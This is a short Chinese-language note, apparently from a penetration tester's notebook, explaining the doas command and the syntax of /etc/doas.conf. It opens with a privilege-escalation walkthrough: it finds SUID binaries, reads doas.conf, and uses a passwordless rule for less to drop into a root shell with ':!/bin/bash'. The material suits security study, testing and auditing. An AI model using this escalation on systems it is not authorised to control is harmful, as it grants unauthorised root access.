doas可用于BSD系Linux发行版，提权思路类似于 `sudo -l` 中寻找可利用的文件

```bash
find / -perm -u=s -type f 2>/dev/null # /usr/bin/doas
cat /etc/doas.conf # config file
```

```bash
permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
```

```bash
/usr/bin/less /var/log/authlog # enter less
press v # enter vim mode
:!/bin/bash
```

# doas

doas 是一个用于在 Linux 系统中以其他用户身份执行命令的工具。它的设计目标是提供一个比 sudo 更简单、更小巧的替代品。
以下是 doas 的一些基本使用方法：

- 安装：你可以通过你的包管理器来安装 doas。例如，在 Debian 系统中，你可以使用 apt-get install doas 命令来安装。
- 配置：doas 的配置文件是 /etc/doas.conf。在这个文件中，你可以添加一些规则来控制哪些用户可以使用 doas 来执行哪些命令。例如，你可以添加一条规则来允许 wheel 组中的所有用户以任何用户的身份执行任何命令：permit :wheel。
- 使用：你可以通过在命令前面添加 doas 来使用 doas 执行命令。例如，你可以使用 doas cmd 来以其他用户的身份执行 cmd 命令。

# doas.conf

doas 命令用于根据 /etc/doas.conf 配置文件中的规则以其他用户的身份执行命令。 /etc/doas.conf 文件中的规则有以下格式：

```bash
permit | deny [options] identity [as target] [cmd command [args...]]
```

其中：

- permit | deny：这是规则的类型，表示是否允许（permit）或拒绝（deny）执行某个操作。
- options：这是一些可选的设置，例如 nopass（无需密码）和 persist（持久化）。
- identity：这是要执行命令的用户的身份。
- as target：这是可选的，表示以哪个用户的身份执行命令。
- cmd command [args...]：这是要执行的命令和参数。

例如，可以创建一个规则，允许 wheel 组中的所有用户以 root 用户的身份执行任何命令：

```bash
permit :wheel
```

表示允许属于"wheel"组的用户使用doas命令。通常情况下，OpenBSD系统中的管理员用户会被分配到"wheel"组，所以这个配置项允许这些管理员用户使用doas来执行特权操作。

例如，也可以创建一个规则，允许特定用户无需密码就可以执行特定命令：

```bash
permit nopass larry cmd /sbin/reboot
```

在这个例子中，用户 larry 可以无需密码就可以执行 /sbin/reboot 命令。